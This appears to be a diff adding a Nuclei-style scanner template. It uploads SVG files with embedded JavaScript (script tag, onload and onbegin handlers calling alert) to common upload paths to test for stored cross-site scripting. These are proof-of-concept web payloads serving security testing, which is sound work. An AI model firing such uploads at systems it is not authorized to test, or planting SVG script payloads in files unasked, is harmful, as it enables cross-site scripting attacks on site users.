@@ -1,0 +1,82 @@
+id: medium-upload-svg-file-xss-payload
+
+info:
+  name: SVG File XSS Payload - Elite Detection
+  author: redteam-elite
+  severity: medium
+  description: |
+    Detects XSS vulnerabilities through SVG file uploads containing malicious JavaScript.
+    This elite template tests various SVG XSS vectors and bypass techniques.
+  reference:
+    - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting
+    - https://cwe.mitre.org/data/definitions/79.html
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
+    cvss-score: 5.4
+    cwe-id: CWE-79
+  tags: upload,xss,svg,file-upload
+
+variables:
+  svg_xss_basic: |
+    <?xml version="1.0" standalone="no"?>
+    <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+    <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+      <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
+      <script type="text/javascript">
+        alert('XSS');
+      </script>
+    </svg>
+  
+  svg_xss_onload: |
+    <svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')">
+      <rect width="100" height="100" fill="red"/>
+    </svg>
+  
+  svg_xss_animate: |
+    <svg xmlns="http://www.w3.org/2000/svg">
+      <animate attributeName="x" values="0;100" dur="1s" onbegin="alert('XSS')" />
+    </svg>
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/upload"
+      - "{{BaseURL}}/upload.php"
+      - "{{BaseURL}}/image/upload"
+      - "{{BaseURL}}/media/upload"
+      - "{{BaseURL}}/files/upload"
+
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW"
+
+    body: |
+      ------WebKitFormBoundary7MA4YWxkTrZu0gW
+      Content-Disposition: form-data; name="file"; filename="{{randstr}}.svg"
+      Content-Type: image/svg+xml
+
+      {{svg_xss_basic}}
+      ------WebKitFormBoundary7MA4YWxkTrZu0gW--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+          - 302
+
+      - type: word
+        condition: or
+        words:
+          - "upload successful"
+          - "file uploaded"
+          - "image uploaded"
+          - "svg uploaded"
+
+    extractors:
+      - type: regex
+        name: svg-content
+        part: body
+        regex:
+          - "(?i)<script[^>]*>.*alert.*</script>"
+          - "(?i)onload=[\"']alert\\([^)]*\\)[\"']"
